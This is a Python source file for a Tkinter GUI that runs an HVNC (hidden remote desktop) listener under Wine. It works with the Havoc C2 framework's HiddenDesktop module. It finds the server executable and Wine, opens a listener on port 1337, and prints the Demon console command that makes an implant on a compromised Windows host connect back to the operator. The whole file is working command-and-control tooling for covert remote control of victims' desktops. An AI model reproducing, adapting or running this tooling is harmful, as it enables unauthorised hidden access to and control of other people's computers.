#!/usr/bin/env python3
"""HVNC operator listener GUI (Linux + Wine). Never copy the .exe to the implant."""
from __future__ import annotations

import os
import re
import socket
import subprocess
import sys

PORT = 1337
ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
WINEPREFIX_DEFAULT = os.path.expanduser("~/.wine-hvnc")

BG = "#1d1814"
FG = "#e8d5b7"
MUTED = "#a89984"
ACCENT = "#fe8019"
OK = "#b8bb26"
BAD = "#fb4934"
FIELD = "#2a221c"

_IPV4 = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")

def dbg(kind, msg):
    tag = {"ok": "[+]", "err": "[-]", "info": "[*]"}.get(kind, "[*]")
    line = "%s %s" % (tag, msg)
    print(line, flush=True)
    return line


def which(name):
    if not name:
        return None
    if os.path.sep in name:
        return name if os.access(name, os.X_OK) else None
    for p in os.environ.get("PATH", "").split(os.pathsep):
        cand = os.path.join(p, name)
        if os.access(cand, os.X_OK) and not os.path.isdir(cand):
            return cand
    return None


def _read_text(path, n=2048):
    try:
        with open(path, "r", errors="ignore") as fh:
            return fh.read(n)
    except OSError:
        return ""


def _elf_class(path):
    try:
        with open(path, "rb") as fh:
            hdr = fh.read(5)
    except OSError:
        return 0
    if hdr[:4] != b"\x7fELF":
        return 0
    return hdr[4]  # 1=32, 2=64


def _is_debian_wine_wrapper(path):
    if not path:
        return False
    if not os.path.isfile(path):
        path = os.path.realpath(path)
    text = _read_text(path)
    return "wine32=" in text and "wine64=" in text


def _looks_like_pe32plus(path):
    try:
        with open(path, "rb") as fh:
            dos = fh.read(64)
            if dos[:2] != b"MZ":
                return False
            fh.seek(60)
            peoff = int.from_bytes(fh.read(4), "little")
            fh.seek(peoff)
            sig = fh.read(6)
            return sig[:4] == b"PE\x00\x00" and sig[4:6] == b"\x64\x86"
    except OSError:
        return False


def _home_roots():
    home = os.path.expanduser("~")
    out = [ROOT]
    extra = [
        os.environ.get("HAVOC_HD_BIN", ""),
        os.path.join(home, "github", "havoc-hiddendesktop"),
        os.path.join(home, "tools", "havoc-hiddendesktop"),
        os.path.join(home, "tools", "HiddenDesktop"),
        os.path.join(home, "github", "HiddenDesktop"),
    ]
    for item in extra:
        if not item:
            continue
        if item.endswith("/bin"):
            item = os.path.dirname(item)
        if item not in out:
            out.append(item)
    return out


def find_hvnc_exe():
    names = ("hd-op.exe", "HVNC Server.exe", "HVNCServer.exe")
    looked = []
    env = os.environ.get("HAVOC_HD_EXE") or os.environ.get("HD_EXE")
    if env:
        looked.append(env)
        if os.path.isfile(env):
            return env, looked
    for root in _home_roots():
        for folder in ("op", "bin", "."):
            base = os.path.join(root, folder) if folder != "." else root
            for name in names:
                cand = os.path.join(base, name)
                looked.append(cand)
                if os.path.isfile(cand):
                    return cand, looked
        for name in names:
            looked.append(os.path.join(root, name))
    return None, looked


def find_wine64():
    looked = []
    for envname in ("WINE64", "WINELOADER"):
        val = os.environ.get(envname)
        if val:
            looked.append("%s=%s" % (envname, val))
            if os.access(val, os.X_OK) and _elf_class(val) == 2:
                return val, looked

    hard = [
        "/usr/lib/wine/wine64",
        "/usr/lib64/wine/wine64",
        "/usr/lib/x86_64-linux-gnu/wine/wine64",
        "/opt/wine-stable/bin/wine64",
        "/opt/wine-devel/bin/wine64",
        "/opt/wine-staging/bin/wine64",
        os.path.expanduser("~/.local/bin/wine64"),
    ]
    path_hit = which("wine64")
    if path_hit:
        hard.insert(0, path_hit)

    for cand in hard:
        looked.append(cand)
        if os.access(cand, os.X_OK) and (_elf_class(cand) in (0, 2)):
            # 0: script that is named wine64 — still OK if executable
            if _elf_class(cand) == 2 or os.path.basename(cand) == "wine64":
                if _elf_class(cand) == 1:
                    continue
                return cand, looked

    wine = which("wine")
    if wine:
        looked.append(wine)
        real = os.path.realpath(wine)
        if _is_debian_wine_wrapper(wine) or _is_debian_wine_wrapper(real):
            looked.append("%s (Debian wrapper: prefers 32-bit wine, skip)" % wine)
        elif _elf_class(real) == 2:
            return real, looked
    return None, looked


def find_wineserver(wine64):
    cands = []
    if wine64:
        d = os.path.dirname(wine64)
        cands.extend(
            [
                os.path.join(d, "wineserver64"),
                os.path.join(d, "wineserver"),
            ]
        )
    cands.extend(
        [
            "/usr/lib/wine/wineserver64",
            "/usr/lib/wine/wineserver",
            which("wineserver64") or "",
            which("wineserver") or "",
        ]
    )
    for c in cands:
        if c and os.access(c, os.X_OK):
            return c
    return None


def find_terminal():
    for name in (
        "alacritty",
        "kitty",
        "wezterm",
        "xfce4-terminal",
        "gnome-terminal",
        "konsole",
        "xterm",
        "x-terminal-emulator",
    ):
        hit = which(name)
        if hit:
            return name, hit
    return None, None


def lan_addrs():
    out = []
    try:
        raw = subprocess.check_output(["ip", "-4", "-br", "a"], text=True)
        for line in raw.splitlines():
            parts = line.split()
            if len(parts) < 3 or parts[0] == "lo":
                continue
            if parts[1] not in ("UP", "UNKNOWN"):
                continue
            ip = parts[2].split("/")[0]
            if ip.startswith("127."):
                continue
            out.append((parts[0], ip))
    except (OSError, subprocess.CalledProcessError):
        pass
    if not out:
        try:
            raw = subprocess.check_output(["hostname", "-I"], text=True)
            for ip in raw.split():
                if _IPV4.match(ip) and not ip.startswith("127."):
                    out.append(("host", ip))
        except (OSError, subprocess.CalledProcessError):
            pass
    if not out:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("1.1.1.1", 80))
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith("127."):
                out.append(("default", ip))
        except OSError:
            pass
    def rank(item):
        iface, ip = item
        if iface.startswith("eth") and ip.startswith("192.168."):
            return 0
        if ip.startswith("192.168."):
            return 1
        if ip.startswith("10."):
            return 2
        if iface.startswith(("docker", "br-", "veth", "virbr", "lxc")):
            return 9
        return 5
    out.sort(key=rank)
    return out


def is_listening(port=PORT):
    needle = ":%04X" % port
    for path in ("/proc/net/tcp", "/proc/net/tcp6"):
        try:
            with open(path) as fh:
                next(fh, None)
                for line in fh:
                    cols = line.split()
                    if len(cols) < 4:
                        continue
                    if cols[3] == "0A" and cols[1].upper().endswith(needle):
                        return True
        except OSError:
            continue
    try:
        raw = subprocess.check_output(["ss", "-lnt"], text=True)
        return any((":%d" % port) in ln and "LISTEN" in ln for ln in raw.splitlines())
    except (OSError, subprocess.CalledProcessError):
        pass
    try:
        raw = subprocess.check_output(["netstat", "-lnt"], text=True)
        return any((":%d" % port) in ln and "LISTEN" in ln for ln in raw.splitlines())
    except (OSError, subprocess.CalledProcessError):
        return False


def havoc_line(ip, port=PORT):
    return "HiddenDesktop %s %d" % (ip, port)


def format_what_to_type(ip, port=PORT, listening=True):
    return "\n".join(
        [
            "======== HVNC ========",
            "[+] LHOST=%s  LPORT=%d" % (ip, port),
            "[+] listener %s" % ("LISTEN 0.0.0.0:%d" % port if listening else "down"),
            "[+] in Havoc (Admin, no rportfwd) type:",
            "",
            "    %s" % havoc_line(ip, port),
            "",
            "    then: hd-launch-cmd",
            "======================",
        ]
    )


class Probe:
    def __init__(self):
        self.lines = []
        self.exe = None
        self.wine64 = None
        self.wineserver = None
        self.term_name = None
        self.term = None
        self.display = os.environ.get("DISPLAY") or ""
        self.wineprefix = os.environ.get("WINEPREFIX") or WINEPREFIX_DEFAULT
        self.ok = False
        self.scan()

    def _log(self, kind, msg):
        self.lines.append(dbg(kind, msg))

    def scan(self):
        self._log("info", "probing operator kit (Linux + Wine64)")
        self._log("info", "repo %s" % ROOT)

        self.exe, looked_exe = find_hvnc_exe()
        if self.exe:
            pe = "PE32+" if _looks_like_pe32plus(self.exe) else "PE?"
            self._log("ok", "HVNC exe  %s  (%s)" % (self.exe, pe))
        else:
            self._log("err", "missing HVNC Server.exe")
            for p in looked_exe[:12]:
                self._log("err", "  looked  %s" % p)
            self._log("info", "build it:  make server   (from repo root)")
            self._log("info", "or set HAVOC_HD_EXE=/path/to/HVNC Server.exe")

        self.wine64, looked_wine = find_wine64()
        if self.wine64:
            self._log("ok", "wine64    %s" % self.wine64)
        else:
            self._log("err", "wine64 not found in PATH")
            for p in looked_wine[:12]:
                self._log("err", "  looked  %s" % p)
            self._log("info", "install:  Debian/Kali  apt install wine64")
            self._log("info", "          Arch         pacman -S wine")
            self._log("info", "          Fedora       dnf install wine")
            self._log("info", "do not use Debian /usr/bin/wine on a 64-bit PE")
            self._log("info", "  (wrapper prefers 32-bit → kernel32.dll / c0000135)")

        self.wineserver = find_wineserver(self.wine64)
        if self.wineserver:
            self._log("ok", "wineserver %s" % self.wineserver)
        else:
            self._log("info", "wineserver not found (STOP may need pkill)")

        if not self.display:
            self.display = ":0.0"
            self._log("info", "DISPLAY unset, trying %s" % self.display)
        else:
            self._log("ok", "DISPLAY   %s" % self.display)

        self.term_name, self.term = find_terminal()
        if self.term:
            self._log("ok", "terminal  %s (%s)" % (self.term_name, self.term))
        else:
            self._log("info", "no GUI terminal in PATH — wine will start without one")

        addrs = lan_addrs()
        if addrs:
            shown = ", ".join("%s=%s" % a for a in addrs[:6])
            self._log("ok", "LHOST     %s" % shown)
        else:
            self._log("err", "no LAN IPv4 detected — type LHOST by hand")

        self._log("info", "WINEPREFIX %s" % self.wineprefix)
        self._log("info", "operator exe stays on this Linux host (not uploaded)")

        self.ok = bool(self.exe and self.wine64)
        if self.ok:
            self._log("ok", "ready — set LHOST, click START")
        else:
            self._log("err", "not ready — fix missing HVNC / wine64")

    def dump(self):
        return "\n".join(self.lines)


def start_wine(probe):
    env = os.environ.copy()
    env["DISPLAY"] = probe.display
    env["WINEARCH"] = "win64"
    env["WINEPREFIX"] = probe.wineprefix
    env["WINELOADER"] = probe.wine64
    env["WINEDEBUG"] = env.get("WINEDEBUG", "-all")
    os.makedirs(probe.wineprefix, exist_ok=True)
    exe = probe.exe
    cwd = os.path.dirname(exe) or "."
    wine_cmd = [probe.wine64, exe]
    if probe.term_name == "alacritty":
        cmd = [
            probe.term,
            "--title",
            "HVNC-KALI",
            "--class",
            "hvnc-server",
            "-e",
            probe.wine64,
            exe,
        ]
    elif probe.term_name == "xterm":
        cmd = [probe.term, "-T", "HVNC-KALI", "-e"] + wine_cmd
    else:
        cmd = wine_cmd
    dbg("info", "exec %s" % " ".join(cmd))
    return subprocess.Popen(cmd, env=env, cwd=cwd, start_new_session=True)


def stop_wine(probe):
    env = os.environ.copy()
    env["WINEPREFIX"] = probe.wineprefix
    if probe.wineserver:
        subprocess.run(
            [probe.wineserver, "-k"],
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        )
    subprocess.run(
        ["pkill", "-f", "HVNC Server.exe"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    subprocess.run(
        ["pkill", "-f", "hd-op.exe"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )


def _tk():
    try:
        import tkinter as tk
        from tkinter import ttk
        return tk, ttk
    except ImportError:
        dbg("err", "tkinter missing (python3-tk)")
        dbg("info", "Debian/Kali:  apt install python3-tk")
        return None, None


def run_gui(probe):
    tk, ttk = _tk()
    if tk is None:
        sys.exit(1)
    addrs = lan_addrs() or [("lan", "0.0.0.0")]

    class App(tk.Tk):
        def __init__(self):
            super().__init__()
            self.title("HVNC listener")
            self.configure(bg=BG)
            self.resizable(False, False)
            self.probe = probe
            self.ip_var = tk.StringVar(value=addrs[0][1])
            self.status_var = tk.StringVar(value="down")
            self._build()
            self.protocol("WM_DELETE_WINDOW", self.destroy)
            self.after(200, self._tick)

        def _build(self):
            wrap = tk.Frame(self, bg=BG)
            wrap.pack(fill="both", expand=True, padx=8, pady=8)
            tk.Label(
                wrap,
                text="HVNC  ·  Linux listener",
                bg=BG,
                fg=ACCENT,
                font=("DejaVu Sans", 14, "bold"),
            ).pack(anchor="w", padx=16, pady=6)
            tk.Label(
                wrap,
                text="Wine 64-bit · port 1337 · exe stays on this host",
                bg=BG,
                fg=MUTED,
                font=("DejaVu Sans", 9),
            ).pack(anchor="w", padx=16, pady=(0, 10))

            grid = tk.Frame(wrap, bg=BG)
            grid.pack(fill="x", padx=16)
            tk.Label(grid, text="LHOST", bg=BG, fg=FG, font=("DejaVu Sans", 10, "bold")).grid(
                row=0, column=0, sticky="w", pady=4
            )
            ttk.Combobox(
                grid,
                textvariable=self.ip_var,
                values=[a[1] for a in addrs],
                width=22,
                font=("DejaVu Sans Mono", 11),
            ).grid(row=0, column=1, sticky="w", padx=(12, 8), pady=4)
            hint = "   ".join("%s=%s" % a for a in addrs[:4]) or "type LAN IP"
            tk.Label(grid, text=hint, bg=BG, fg=MUTED, font=("DejaVu Sans", 8)).grid(
                row=1, column=1, sticky="w", padx=(12, 0)
            )
            tk.Label(grid, text="LPORT", bg=BG, fg=FG, font=("DejaVu Sans", 10, "bold")).grid(
                row=2, column=0, sticky="w", pady=4
            )
            tk.Label(
                grid,
                text=str(PORT),
                bg=FIELD,
                fg=FG,
                width=10,
                anchor="w",
                padx=8,
                font=("DejaVu Sans Mono", 11),
            ).grid(row=2, column=1, sticky="w", padx=(12, 8), pady=4)

            btns = tk.Frame(wrap, bg=BG)
            btns.pack(fill="x", padx=16, pady=(14, 8))
            self._btn(btns, "START", ACCENT, self.on_start).pack(side="left", ipadx=18, ipady=6)
            self._btn(btns, "STOP", BAD, self.on_stop).pack(
                side="left", padx=(10, 0), ipadx=18, ipady=6
            )
            tk.Label(
                btns,
                textvariable=self.status_var,
                bg=BG,
                fg=FG,
                font=("DejaVu Sans Mono", 10),
            ).pack(side="left", padx=16)

            tk.Label(
                wrap,
                text="after START, type this in the Demon console:",
                bg=BG,
                fg=MUTED,
                font=("DejaVu Sans", 9),
            ).pack(anchor="w", padx=16, pady=(8, 0))
            self.log = tk.Text(
                wrap,
                height=16,
                width=72,
                bg=FIELD,
                fg=OK,
                insertbackground=FG,
                relief="flat",
                font=("DejaVu Sans Mono", 9),
                padx=10,
                pady=8,
            )
            self.log.pack(fill="x", padx=16, pady=(4, 12))
            self._set_log(probe.dump() + "\n\n" + format_what_to_type(self.ip_var.get(), listening=False))
            self.ip_var.trace_add("write", lambda *_: None)

        def _btn(self, parent, text, color, cmd):
            return tk.Button(
                parent,
                text=text,
                command=cmd,
                bg=color,
                fg="#1d1814",
                activebackground=FG,
                activeforeground=BG,
                relief="flat",
                font=("DejaVu Sans", 10, "bold"),
                cursor="hand2",
            )

        def _set_log(self, text):
            self.log.configure(state="normal")
            self.log.delete("1.0", "end")
            self.log.insert("1.0", text)
            self.log.configure(state="disabled")

        def _ip(self):
            ip = self.ip_var.get().strip()
            return ip if _IPV4.match(ip) else None

        def _tick(self):
            up = is_listening()
            self.status_var.set("LISTEN  0.0.0.0:%d" % PORT if up else "down")
            self.after(1000, self._tick)

        def on_start(self):
            ip = self._ip()
            if not ip:
                dbg("err", "invalid LHOST (need IPv4 LAN address)")
                return
            if not self.probe.ok:
                dbg("err", "refusing START — missing HVNC or wine64")
                self._set_log(self.probe.dump())
                return
            if is_listening():
                dbg("info", "already listening on :%d" % PORT)
                banner = format_what_to_type(ip, listening=True)
                print("\n%s\n" % banner, flush=True)
                self._set_log(self.probe.dump() + "\n\n" + banner)
                return
            dbg("info", "starting wine64  LHOST=%s LPORT=%d" % (ip, PORT))
            start_wine(self.probe)
            self.after(2500, lambda: self._after_start(ip))

        def _after_start(self, ip, tries=0):
            if is_listening():
                banner = format_what_to_type(ip, listening=True)
                print("\n%s\n" % banner, flush=True)
                self._set_log(self.probe.dump() + "\n\n" + banner)
                return
            if tries < 16:
                self.after(400, lambda: self._after_start(ip, tries + 1))
                return
            dbg("err", "no LISTEN :%d — check Wine window / kernel32.dll" % PORT)
            self._set_log(
                self.probe.dump()
                + "\n[-] no LISTEN :%d after start\n"
                "[*] if kernel32.dll / c0000135: you ran 32-bit wine on a PE32+\n" % PORT
            )

        def on_stop(self):
            dbg("info", "stopping HVNC")
            stop_wine(self.probe)
            self.after(400, lambda: self._set_log(self.probe.dump()))

    App().mainloop()


def main():
    probe = Probe()
    if "--check" in sys.argv:
        sys.exit(0 if probe.ok else 1)
    run_gui(probe)


if __name__ == "__main__":
    main()
